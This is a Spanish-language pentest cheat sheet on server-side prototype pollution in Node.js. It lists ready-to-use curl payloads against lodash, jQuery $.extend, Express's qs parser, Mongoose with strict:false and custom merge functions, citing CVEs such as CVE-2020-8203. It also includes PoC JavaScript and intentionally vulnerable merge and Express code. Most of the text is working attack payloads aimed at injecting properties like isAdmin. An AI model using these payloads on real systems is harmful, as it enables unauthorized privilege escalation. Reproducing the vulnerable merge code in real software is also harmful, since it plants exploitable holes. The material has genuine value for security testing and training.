---
aliases:
  - Server-Side PP
  - Node.js Prototype Pollution
  - Lodash PP
tags:
  - vuln/prototype-pollution
  - technique/initial-access
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Prototype Pollution]]"
---
# Prototype Pollution - Vectores Server-Side

---

## Lodash (`_.merge` / `_.set` / `_.defaultsDeep`)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -H "Content-Type: application/json" -d '{"__proto__":{"polluted":"yes"}}' https://target/api/x` | Lodash `_.merge` pollution global | Backend usa `_.merge(target, req.body)`. |
| `curl -X POST -H "Content-Type: application/json" -d '{"constructor":{"prototype":{"polluted":"yes"}}}' https://target/api/x` | `__proto__` blocked → constructor.prototype bypass | Filter incompleto. |
| `curl -X POST -d '{"path":"__proto__.isAdmin","value":true}' https://target/api/set` | `_.set` polluted via path string | Lodash `_.set` (`<4.17.20` CVE-2020-8203). |
| `curl -X POST -d '{"path":["__proto__","isAdmin"],"value":true}' https://target/api/set` | `_.set` con array path | Variant. |
| `curl -X POST -H "Content-Type: application/json" -d '{"__proto__":{"isAdmin":true}}' https://target/api/defaults` | `_.defaultsDeep` pollution | CVE-2018-16487. |
| `curl -X POST -d '{"paths":["__proto__.isAdmin"],"values":[true]}' https://target/api/zipobjectdeep` | `_.zipObjectDeep` pollution | CVE-2020-8203. |
| Post-pollution probe: `curl https://target/api/health` → response contiene `polluted:"yes"` o `isAdmin:true` | Confirma pollution global | Verification. |
| `npm audit \| grep -i lodash` (en target source si disponible) | Identify lodash version vulnerable | Pre-attack version check. |
^pp-server-lodash

### PoC server-side lodash

```javascript
const _ = require('lodash');
const obj = {};

const userInput = JSON.parse('{"__proto__":{"isAdmin":true}}');
_.merge(obj, userInput);

console.log({}.isAdmin);  // true — TODOS los objetos ahora tienen isAdmin
```

---

## jQuery `$.extend` deep

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -H "Content-Type: application/json" -d '{"__proto__":{"polluted":"yes"}}' https://target/api/x` | jQuery server-side `$.extend(true, ...)` pollution | Cheerio/JSDOM en Node. |
| `curl -X POST -d '{"constructor":{"prototype":{"polluted":"yes"}}}' https://target/api/x` | constructor.prototype bypass post jQuery 3.4.0 | Patched __proto__ check. |
| Post-pollution: `curl https://target/api/health` → ver si polluted | Confirma | Verification. |
| `curl -s https://target/static/jquery*.js \| grep -oE 'jQuery v[0-9.]+' \| head -1` | Identify jQuery version | Pre-attack. |
^pp-server-jquery

---

## Express body-parser y `qs`

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST "https://target/api/x?__proto__[polluted]=yes&name=test"` | qs parser convierte `__proto__[k]` a object — pollution antes que app handle | Express `extended:true` (qs lib). |
| `curl -X POST "https://target/api/x?obj[__proto__][polluted]=yes"` | Nested key pollution | qs deep parse. |
| `curl -X POST "https://target/api/x?__proto__[]=yes"` | Array notation | qs array parsing. |
| `curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "__proto__[polluted]=yes" https://target/api/x` | Body URL-encoded pollution | Same parser body. |
| `curl https://target/api/health` post-pollution | Confirma global state polluted | Verification request. |
| `curl -X POST -H "Content-Type: application/json" -d '{"__proto__":{"polluted":"yes"}}' https://target/api/x` | JSON body pollution (si app usa lodash/custom merge) | Alternative entry. |
| `grep -rE 'extended\s*:\s*true' source/` | Identify Express config vulnerable | Pre-attack source review. |
^pp-server-express

### Express PP via qs

```javascript
// Vulnerable
const express = require('express');
const app = express();
app.use(express.urlencoded({extended: true}));  // qs lib

app.get('/health', (req,res) => res.json({status: 'ok'}));

// Atacante:
// curl -X POST 'https://target/profile?__proto__[isAdmin]=true' -d 'name=x'
// Después:
// curl https://target/health → {status:"ok",isAdmin:true}
```

---

## Mongoose Schema Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X PATCH -H "Cookie: $C" -d '{"$set":{"__proto__":{"isAdmin":true}}}' https://target/api/users/me` | Mongoose `findOneAndUpdate({$set: req.body})` pollution | Schema `strict:false`. |
| `curl -X PATCH -H "Cookie: $C" -d '{"__proto__":{"$ne":null}}' https://target/api/users/me` | NoSQL operator + PP combo | Mongoose + NoSQL injection. |
| `curl -X PATCH -H "Cookie: $C" -d '{"constructor":{"prototype":{"isAdmin":true}}}' https://target/api/users/me` | constructor.prototype bypass | Filter incompleto. |
| `curl -X POST -H "Cookie: $C" -d '{"name":"x","__proto__":{"global":"polluted"}}' https://target/api/items` | Pollution via Document.set durante save | Document mutation. |
| Post-pollution probe: GET `/api/items` y verificar global field | Confirma pollution persiste | Verification. |
| `grep -rE 'strict\s*:\s*false' models/` | Identify schemas vulnerable | Pre-attack source. |
^pp-server-mongoose

---

## `Object.assign` con Input Controlado

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -H "Content-Type: application/json" -d '{"__proto__":{"isAdmin":true}}' https://target/api/x` | Custom recursive merge function pollution | App con custom merge. |
| `curl -X POST -d '{"name":"x","constructor":{"prototype":{"global":"pwd"}}}' https://target/api/x` | constructor.prototype variant | Filter __proto__ only. |
| `curl -X POST -d '{"deeply":{"nested":{"__proto__":{"x":"y"}}}}' https://target/api/x` | Nested PP — merge descend en objetos | Deep merge. |
| Post-pollution: `curl https://target/api/health` ver si new field aparece | Confirma | Verification. |
| `grep -rE 'function merge\|deepMerge\|recursiveMerge\|deepClone' source/` | Identify custom merge functions | Source review. |
^pp-server-objectassign

### Custom recursive merge vulnerable

```javascript
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = target[key] || {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Atacante:
merge({}, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
console.log({}.polluted);  // 'yes' — global pollution
```

---
